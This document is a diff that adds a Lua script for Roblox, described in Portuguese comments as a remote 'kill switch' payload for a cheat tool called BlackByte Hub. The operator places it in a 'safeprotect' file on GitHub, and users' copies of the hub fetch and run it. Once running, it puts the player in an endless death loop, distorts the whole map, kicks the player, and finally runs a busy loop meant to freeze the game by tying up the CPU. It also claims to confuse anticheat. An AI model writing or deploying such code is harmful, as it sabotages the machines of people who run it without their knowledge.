@@ -1,1 +1,93 @@
+-- ============================================================
+-- BLACKBYTE HUB - PAYLOAD DE SEGURANÇA E CAOS ("BOMBA ATIVA")
+-- ============================================================
+-- Instruções de Uso:
+-- Quando você quiser desativar o script de um usuário ou aplicar
+-- a punição extrema, copie todo este código e cole dentro do seu 
+-- arquivo "safeprotect" no seu GitHub.
+-- O script do jogador lerá este arquivo e executará o caos remotamente!
+-- ============================================================
 
+task.spawn(function()
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local LP = Players.LocalPlayer
+
+    -- 1. Destrói toda a interface do BlackByte Hub da tela imediatamente
+    pcall(function()
+        if _G.gui then _G.gui:Destroy() end
+        if _G.loadingOverlay then _G.loadingOverlay:Destroy() end
+        if _G.introSound then _G.introSound:Destroy() end
+        
+        -- Limpa loops e conexões na memória RAM
+        for _, conn in ipairs(_G.BlackByteRuntimeConnections or {}) do pcall(conn.Disconnect) end
+        for _, conn in pairs(_G.Conns or {}) do 
+            pcall(function() 
+                if typeof(conn) == "RBXScriptConnection" then 
+                    conn:Disconnect() 
+                else 
+                    for _, c in pairs(conn) do pcall(c.Disconnect) end 
+                end 
+            end) 
+        end
+    end)
+
+    -- 2. LOOP INFINITO DE MORTE (Deletar o Humanoid continuamente)
+    -- Isso força o jogador a ficar morrendo e renascendo em um ciclo infinito na velocidade da luz!
+    task.spawn(function()
+        while true do
+            pcall(function()
+                local char = LP.Character
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
+                if hum then
+                    hum:Destroy() -- Deleta o Humanoid localmente, matando o personagem instantaneamente
+                end
+            end)
+            task.wait(0.05) -- Morre de novo imediatamente após renascer
+        end
+    end)
+
+    -- 3. CAOS GEOMÉTRICO (Rotacionar, colorir e redimensionar o mapa inteiro no Client)
+    -- Isso deforma o mapa fisicamente, ativa colisões e buga o anticheat do servidor por inconsistência de física!
+    pcall(function()
+        for _, obj in ipairs(workspace:GetDescendants()) do
+            if obj:IsA("BasePart") and not obj:IsDescendantOf(LP.Character) then
+                pcall(function()
+                    -- Ativa colisões físicas para ele bater nas coisas deformadas
+                    obj.CanCollide = true
+                    obj.Anchored = true
+                    
+                    -- Altera o material para Neon para criar um efeito visual cegante
+                    obj.Material = Enum.Material.Neon
+                    
+                    -- Define cores neon totalmente aleatórias e piscantes
+                    obj.Color = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
+                    
+                    -- Deforma o tamanho do bloco aleatoriamente de 1x a 5x do tamanho original
+                    obj.Size = obj.Size * math.random(1.2, 5.0)
+                    
+                    -- Rotaciona a estrutura em direções angulares caóticas e aleatórias
+                    obj.CFrame = obj.CFrame * CFrame.Angles(
+                        math.rad(math.random(-180, 180)),
+                        math.rad(math.random(-180, 180)),
+                        math.rad(math.random(-180, 180))
+                    )
+                end)
+            end
+        end
+    end)
+
+    -- 4. KICK CLÁSSICO E CONGELAMENTO DE BUFFER (ANTI BYPASS DE KICK)
+    pcall(function()
+        LP:Kick("BlackByte Hub | Sua licenca foi revogada e o ambiente de execucao auto-destruido!")
+    end)
+    
+    task.wait(0.2)
+    
+    -- Se o cara estiver usando Anti-Kick de PC/Mobile para anular o chute do servidor,
+    -- este loop infinito sem espera trava a CPU alocada para o Roblox dele na hora,
+    -- fechando ou congelando o jogo de forma estática!
+    while true do 
+        -- Congelamento de thread total
+    end
+end)
